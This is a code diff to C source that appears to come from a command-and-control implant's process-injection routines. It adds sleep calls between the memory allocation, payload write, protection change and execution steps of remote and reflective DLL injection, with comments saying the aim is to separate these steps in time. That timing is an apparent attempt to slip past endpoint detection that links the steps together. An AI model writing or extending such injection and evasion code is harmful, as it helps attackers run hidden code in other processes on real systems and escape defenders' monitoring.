@@ -91,6 +91,9 @@ DWORD Inject(
         PRINTF( "[INJECT] Allocated memory in the remote process: %p\n", Memory )
     }
 
+    /* HVC-046: dissociate alloc->protect in time */
+    ExecDelaySleep();
+
     /* write payload into remote process memory */
     if ( ! ( MmVirtualWrite( Process, Memory, Payload, Size ) ) ) {
         PUTS( "[INJECT] Failed to write payload into remote process" )
@@ -106,6 +109,9 @@ DWORD Inject(
     } else {
         PUTS( "[INJECT] Changed memory protection from RW to RX" )
     }
+
+    /* HVC-046: dissociate protect->execute in time */
+    ExecDelaySleep();
 
     /* check if any args has been specified */
     if ( Argv && ( Argc > 0 ) )
@@ -261,6 +267,8 @@ DWORD DllInjectReflective( HANDLE hTargetProcess, LPVOID DllLdr, DWORD DllLdrSiz
     if ( MemLibraryBuffer )
     {
         PUTS( "[+] NtAllocateVirtualMemory: success" );
+        /* HVC-046: dissociate alloc->write in time */
+        ExecDelaySleep();
         if ( NT_SUCCESS( NtStatus = SysNtWriteVirtualMemory( hTargetProcess, MemLibraryBuffer, FullDll, FullDllSize, &BytesWritten ) ) )
         {
             // TODO: check to get the .text section and size of it
@@ -274,6 +282,9 @@ DWORD DllInjectReflective( HANDLE hTargetProcess, LPVOID DllLdr, DWORD DllLdrSiz
             // NtStatus = Instance->Win32.NtProtectVirtualMemory( hTargetProcess, &MemRegion, &MemRegionSize, PAGE_EXECUTE_READ, &OldProtect );
             if ( MmVirtualProtect( DX_MEM_SYSCALL, hTargetProcess, MemRegion, MemRegionSize, PAGE_EXECUTE_READ ) )
             {
+                /* HVC-046: dissociate protect->execute in time */
+                ExecDelaySleep();
+
                 ctx->Parameter = MemParamsBuffer;
                 PRINTF( "ctx->Parameter: %p\n", ctx->Parameter )
 
